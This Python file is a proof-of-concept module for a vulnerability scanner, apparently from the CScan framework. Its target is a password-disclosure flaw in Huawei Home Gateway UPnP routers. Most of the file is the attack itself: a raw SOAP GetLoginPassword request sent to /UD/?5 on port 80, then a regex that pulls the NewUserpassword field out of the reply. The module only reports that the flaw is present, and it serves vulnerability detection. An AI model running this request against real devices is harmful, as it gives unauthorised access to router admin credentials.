# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import socket
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'Huawei_0001'  # 平台漏洞编号，留空
    name = 'Huawei Home Gateway UPnP/1.0 IGD/1.00 密码泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-03'  # 漏洞公布时间
    desc = '''
        Huawei Home Gateway UPnP/1.0 IGD/1.00 Password Disclosure Exploit.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37424/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华为'  # 漏洞应用名称
    product_version = 'Huawei Home Gateway UPnP/1.0 IGD/1.00'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ccab5d83-ec24-4ea5-be32-85b7cd688639'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # set timeout
            timeout = 20
            socket.setdefaulttimeout(timeout)
            # 取出地址和端口
            proto, rest = urllib.parse.splittype(self.target)
            host, rest = urllib.parse.splithost(rest)
            host, port = urllib.parse.splitport(host)
            #portint = int(port)
            #target = transform_target_ip(args['options']['target'])
            # Connect the socket to the port where the server is listening
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (host, 80)
            sock.connect(server_address)
            soap = "<?xml version=\"1.0\"?>"
            soap += "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
            soap += "<s:Body>"
            soap += "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
            soap += "</m:GetLoginPassword>"
            soap += "</s:Body>"
            soap += "</s:Envelope>"
            message = "POST /UD/?5 HTTP/1.1\r\n"
            message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
            message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
            message += "Host:" + host + "\r\n"
            message += "Content-Length:" + str(len(soap)) + "\r\n"
            message += "Expect: 100-continue\r\n"
            message += "Connection: Keep-Alive\r\n\r\n"
            sock.send(message)
            data = sock.recv(1024)

            sock.send(soap)
            data = sock.recv(1024)
            data += sock.recv(1024)
            r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
            m = r.search(data)
            if m:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
